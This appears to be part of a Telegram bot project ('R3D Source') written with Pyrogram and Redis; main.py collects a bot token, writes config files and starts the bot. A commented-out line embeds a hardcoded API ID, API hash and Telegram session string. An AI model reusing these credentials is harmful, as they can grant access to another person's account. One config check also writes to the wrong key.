                reply_markup=InlineKeyboardMarkup (
                [
                [InlineKeyboardButton ("Try whisper", switch_inline_query='Hi @all')]
                ]
                ),
                input_message_content=InputTextMessageContent(text, disable_web_page_preview=True)
            ),
        ],
        )
    

# ==================== FILE: main.py ====================
r = redis.Redis('localhost',decode_responses=True)

to_config = """
r = redis.Redis('localhost',decode_responses=True)
"""

print('''
Loading…
█▒▒▒▒▒▒▒▒▒''')
print('\n\n')

try:
  Dev_Zaid = token.split(':')[0]
  r.set(f'{Dev_Zaid}botowner', owner_id)
except Exception as e:
  with open ('information.py','w+') as www:
     token = input ('[+] Enter the bot token : ')
     Dev_Zaid = token.split(':')[0]
     if not r.get(f'{Dev_Zaid}botowner'):
       owner_id = int(input('[+] Enter SUDO ID : '))
       r.set(f'{Dev_Zaid}botowner', owner_id)
     else:
        owner_id = int(r.get(f'{Dev_Zaid}botowner'))
     text = 'token = "{}"\nowner_id = {}'
     www.write(text.format(token, owner_id))

    


if not r.get(f'{Dev_Zaid}botowner'):
    owner_id = int(input('[+] Enter SUDO ID : '))
    r.set(f'{Dev_Zaid}botowner', owner_id)
else:
    owner_id = int(r.get(f'{Dev_Zaid}botowner'))
print('''
10% 
███▒▒▒▒▒▒▒ ''')

to_config += f"\ntoken = '{token}'"
to_config += f"\nDev_Zaid = token.split(':')[0]"
to_config += f"\nsudo_id = {owner_id}"
username = requests.get(f"https://api.telegram.org/bot{token}/getMe").json()["result"]["username"]
to_config += f"\nbotUsername = '{username}'"
to_config += "\nfrom kvsqlite.sync import Client as DB"
to_config += "\nytdb = DB('ytdb.sqlite')"
to_config += "\nsounddb = DB('sounddb.sqlite')"
to_config += "\nwsdb = DB('wsdb.sqlite')"

print('''
30% 
█████▒▒▒▒▒ ''')
with open('config.py','w+') as w:
  w.write(to_config)
print('''
50% 
███████▒▒▒ ''')
app = Client(f'{Dev_Zaid}r3d', API_ID, API_HASH,
  bot_token=token,
    plugins={"root": "Plugins"},
  )
# userbot = Client('userbott', 9398500, "ad2977d673006bed6e5007d953301e13", session_string="BACPaOQAw9EWMijb1D8m_wYGIa2r6tnaNiJDVTuC4jVktrtF5K7UxjNuZNcA-HpmEBltGr-0rUrELER9Vj0CmkNb28BdGYGETl5dJIg386wdjv3ZYNB3HkYrbhN5GFE4w2tYNv5dQJmvLTtvC3bTa0HoW64YLPINX_3BEZSoyXPm_bbXonA_2PIqeA1MHdEzfg_U4Zy75xyBq0pBvTv6xhD9hpAliXHnapJ5gg4C8Qt4QX4JLMGYxaSTNt51OClNVpPU6yiKZBFYl-t6CP66VmL3JU3P3HshrCSlcY38GfZ7Uy_w1b7HCqqe9EnVmZV0k3S29YtFlGz9Z0uuw0pxloAFpebeTwAAAABydGQqAA")
  
if not r.get(f'{Dev_Zaid}:botkey'):
    r.set(f'{Dev_Zaid}:botkey', '⇜')

if not r.get(f'{Dev_Zaid}botname'):
    r.set(f'{Dev_Zaid}botname', 'رعد')

if not r.get(f'{Dev_Zaid}botchannel'):
    r.set(f'{Dev_Zaid}botname', 'eFFb0t')

# Redundant definition of Find removed
  
# @app.on_message(filters.group & filters.regex("^انستا "), group=-1)
# async def instaDownlo(c,m):
#   if not r.get(f'{m.chat.id}:disableINSTA:{Dev_Zaid}') and Find(m.text):
#     url = Find(m.text)[0]
#     rep = await m.reply("...")
#     await m.reply_chat_action(enums.ChatAction.TYPING)
#     msg = await userbot.send_message("instasavegrambot", url)
#     await rep.edit("Wait ...")
#     await asyncio.sleep(20)
#     await m.reply_chat_action(enums.ChatAction.UPLOAD_DOCUMENT)
#     msg = await userbot.get_messages("instasavegrambot",msg.id+1)
#     await rep.delete()
#     if msg.media_group_id:
#        r.set("media:insta", f"{m.chat.id}&&&{m.id}", ex=10)
#        msg = await userbot.copy_media_group("iwwbot", "instasavegrambot",msg.id)
#     else:
#        msg = await msg.download("./")
#        try:
#           return await m.reply_video(msg)
#        except:
#           pass
#        try:
#           return await m.reply_animation(msg)
#        except:
#           pass
       
#        try:
#           return await m.reply_photo(msg)
#        except:
#           pass
       
#        try:
#           return await m.reply_document(msg)
#        except:
#           pass
#        os.remove(msg)
    
     
# @app.on_message(filters.private & filters.user(1920230442))
# async def mediagCopy(c,m):
#    if r.get("media:insta") and m.media_group_id:
#       chat_id = r.get("media:insta").split("&&&")[0]
#       id = r.get("media:insta").split("&&&")[1]
#       await c.copy_media_group(int(chat_id), m.from_user.id, m.id,reply_to_message_id=int(id))
#       r.delete("media:insta")
      

app.start()
# userbot.start()
print('''
[===========================]

█████╗░██████╗░██████╗░
██╔══██╗╚════██╗██╔══██╗
██████╔╝░█████╔╝██║░░██║
██╔══██╗░╚═══██╗██║░░██║
██║░░██║██████╔╝██████╔╝
╚═╝░░╚═╝╚═════╝░╚═════╝░

[===========================]

🔮 Your bot started successfully on R 3 D ☆ Source 🔮

•••••••• @yqyqy66 - @yqyqy66 •••••••••


''')
print('''

100% 
██████████''')
if r.get(f'DevGroup:{Dev_Zaid}'):
  id = int(r.get(f'DevGroup:{Dev_Zaid}'))
  try:
    app.send_message(id, "تم اتشغيل البوت بنجاح ✔️")
  except:
    pass
idle()
  
